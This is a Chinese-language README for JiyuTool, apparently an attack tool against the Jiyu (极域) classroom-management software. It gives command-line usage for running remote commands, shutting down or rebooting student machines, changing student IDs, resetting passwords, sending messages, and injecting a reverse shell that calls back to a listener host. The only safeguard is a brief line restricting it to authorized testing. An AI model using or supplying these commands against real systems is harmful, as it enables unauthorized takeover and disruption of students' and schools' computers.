# JiyuTool

JiyuTool 是一款通过极域特定协议与远程系统通信的工具，支持远程命令执行、关机重启、发送消息、修改ID等功能，还可发起反向Shell连接。

## 功能特性

- 远程执行命令
- 修改学生端 ID
- 重置密码
- 关机与重启控制
- 发送消息
- 发起反向 Shell

## 使用方法

### 环境依赖

- Python 3.6+

### 命令行参数

```
python main.py --ip <目标IP> [--port <目标端口>] <command> [command_options]
```

#### 可用命令

```
# 关机
python script.py --ip 192.168.1.10 power --shutdown

# 重启
python script.py --ip 192.168.1.10 power

# 执行命令
python script.py --ip 192.168.1.10 exec --cmd "whoami"

# 发消息
python script.py --ip 192.168.1.10 message --msg "请保存好你的文件，系统将重启"

# 修改学生ID
python script.py --ip 192.168.1.10 id --tid 12

# 重置密码
python script.py --ip 192.168.1.10 reset --pwd newpass123

# 注入反向shell
python script.py --ip 192.168.1.10 shell --lhost 10.20.73.20
```



## 注意事项

- 仅供授权测试使用！禁止用于非法用途！

